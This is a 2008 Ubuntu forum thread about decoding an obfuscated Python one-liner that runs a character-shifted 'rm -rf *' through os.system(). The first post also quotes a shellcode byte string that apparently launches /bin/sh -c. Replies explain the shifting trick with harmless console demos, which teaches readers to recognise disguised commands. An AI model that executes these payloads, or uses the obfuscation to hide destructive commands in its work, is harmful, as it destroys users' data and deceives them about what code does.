---
title: "[SOLVED] how to decipher obfuscated commands?"
date: 2008-07-16
forum: New to Ubuntu
---

### Post by meindian523 on 2008-07-16
Referring [this announcement]('http://ubuntuforums.org/announcement.php?f=326') about malicious commands.

```
<some code deleted to make this harmless>'import os; os.system("".join([chr(ord(i)-1) for i in "sn!.sg!+"]))'
```

is rm -rf * shifted a character up according to jdong.I would like to know,what exactly IS shifting up by a character and how does sn!.sg!+ translate to rm -rf *
No malicious intentions,but I'm creating a techie event for our college technical festival and would like to use this form of obfuscation for a killer code which the participants would have to decipher.

Also,for the same reasons,please explain
```

"\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68"
                  "\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99"
                  "\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7"
                  "\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56"
                  "\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31"
                  "\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69"
                  "\x6e\x2f\x73\x68\x00\x2d\x63\x00"
```

Is this just using ASCII code converted into hex?

---

### Post by brokenLockpick on 2008-07-16
> **meindian523 said:**
> Referring [this announcement]('http://ubuntuforums.org/announcement.php?f=326')

Is this just using ASCII code converted into hex?

those are definitely hex values, you can look up the tables for what each hex value corresponds to in ascii

---

### Post by meindian523 on 2008-07-16
Wel,I know those are hex values.I shall do what you suggest and get back.Why didn't I think of that?#-o#-o#-o

---

### Post by meindian523 on 2008-07-16
Well,that didn't work.What I got looking malicious was only /bin/sh -c,no rm -rf or anything.

---

### Post by brokenLockpick on 2008-07-16
> **meindian523 said:**
> Wel,I know those are hex values.I shall do what you suggest and get back.Why didn't I think of that?#-o#-o#-o

Sorry I'd have posted a link but I kept finding cumbersome converters. 

It may be deeper than purely ascii. I tried formatting the last line the way the converter wanted and all I got back was
```
n/sh
```

---

### Post by meindian523 on 2008-07-16
So I found.And we did the same search I guess,I got only cumbersome converters too.:) :)

---

### Post by Bachstelze on 2008-07-16
> **meindian523 said:**
> Referring [this announcement]('http://ubuntuforums.org/announcement.php?f=326') about malicious commands.

```
<some code deleted to make this harmless>'import os; os.system("".join([chr(ord(i)-1) for i in "sn!.sg!+"]))'
```

is rm -rf * shifted a character up according to jdong.I would like to know,what exactly IS shifting up by a character and how does sn!.sg!+ translate to rm -rf *

Very simple, it is just done by converting each character in "rm -rf *" to it's ASCII value, adding one, and converting back to a string. You can see how this works by doing this :

(Note : this is **safe**, it will just display the command, not run it.)

```
Python 2.5.2 (r252:60911, Jul 12 2008, 13:04:36)
[GCC 4.3.1] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> "sn!.sg!+"  # this is the command in "hidden" form
'sn!.sg!+'
>>> char = "b"; chr(ord(char) - 1)   # this is the command that "decreases" each character by one
'a'
>>> [chr(ord(i)-1) for i in "sn!.sg!+"]    # this will apply the above function to each character in the string using a for loop, and return the resulting characters in a list
['r', 'm', ' ', '-', 'r', 'f', ' ', '*']
>>> "".join([chr(ord(i)-1) for i in "sn!.sg!+"])   # this takes the list returned by the above command, and concatenates them into a single string
'rm -rf *'
```

finally, [font="courier new"]os.system(foo)[/font] executes the command that is stored in string [font="courier new"]foo[/font], and voilà.

Once again, this is safe, you can experiment with it as you wish, just don't run [font="courier new"]os.system()[/font] without double-checking that you're not running something nasty with it.

---

### Post by brokenLockpick on 2008-07-16
some googling revealed that the "chr(ord(i)-1)" section is most likely taking the ascii value of the character and subtracting 1 from it e.g. making s become r etc. To the machiene the command looks like "rm -f"

Edit: wow the above post was much better guess that's what I get for hanging on the post window whill looking up the commands

---

### Post by meindian523 on 2008-07-16
Ok,that means if I wanted to shift the capital A up by one character,then I would take 65(the ASCII code),add 1,thus 66 and then reconvert to the letter B.Now,how does the shell know it's been shifted a character up?Why would it convert it back?Wouldn't it just give an error saying: so-and-so command not found?
Of course,the existence of such a thing implies that the shell does convert it back,but I would still like to know why it does that.

EDIT:
@BrokenLockPick
Me too. :P

---

### Post by meindian523 on 2008-07-16
duplicate post.

---

### Post by Bachstelze on 2008-07-16
> **meindian523 said:**
> 
Of course,the existence of such a thing implies that the shell does convert it back,but I would still like to know why it does that.

The shell does not. Python does, because that's what the command tells it to do ;)

---

### Post by meindian523 on 2008-07-16
What's os.system() do?Is it a system call or a call to some executing program?

Also,now suppose I wanted to convert some text from Wikipedia into the obfuscated form above,I would,in a python console,do
```
[chr(ord(i)**+<or>-**<whatever number I want>) for i in <whatever text I want to convert in double quotes>]
```
correct?

---

### Post by Bachstelze on 2008-07-16
> **meindian523 said:**
> What's os.system() do?Is it a system call or a call to some executing program?

It is the Python function that will pass the string given in argument as a command for the shell to execute.

> **meindian523 said:**
> Also,now suppose I wanted to convert some text from Wikipedia into the obfuscated form above,I would,in a python console,do
```
[chr(ord(i)**+<or>-**<whatever number I want>) for i in <whatever text I want to convert in double quotes>]
```
correct?

Not quite, but you could have tried for yourself ;)

```
firas@nobue ~ % python
Python 2.5.2 (r252:60911, Jul 12 2008, 13:04:36)
[GCC 4.3.1] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> s = "Le jour n'est pas plus pur que le fond de mon coeur."  # the input string
>>> print s
Le jour n'est pas plus pur que le fond de mon coeur.
>>> l = [chr(ord(i)-2) for i in s]   # a list containing the resulting characters
>>> print l
['J', 'c', '\x1e', 'h', 'm', 's', 'p', '\x1e', 'l', '%', 'c', 'q', 'r', '\x1e', 'n', '_', 'q', '\x1e', 'n', 'j', 's', 'q', '\x1e', 'n', 's', 'p', '\x1e', 'o', 's', 'c', '\x1e', 'j', 'c', '\x1e', 'd', 'm', 'l', 'b', '\x1e', 'b', 'c', '\x1e', 'k', 'm', 'l', '\x1e', 'a', 'm', 'c', 's', 'p', ',']
>>> s2 = "".join(l)   # the resulting string, it will append all the elements of the list given as argument to the input string (here, the empty string)
>>> print s2
Jchmspl%cqrn_qnjsqnsposcjcdmlbbckmlamcsp,
>>> print "".join([chr(ord(i)-2) for i in "Le jour n'est pas plus pur que le fond de mon coeur."])   # one-liner
Jchmspl%cqrn_qnjsqnsposcjcdmlbbckmlamcsp,
>>> print "".join([chr(ord(i)+2) for i in s2])  #and just to be sure
Le jour n'est pas plus pur que le fond de mon coeur.

```

So the code you posted would just give you a list of characters, you'd then have to use [font="courier new"]join()[/font] to make a single string out of it.

---

### Post by meindian523 on 2008-07-16
of course,I thought of it only after I posted.

---

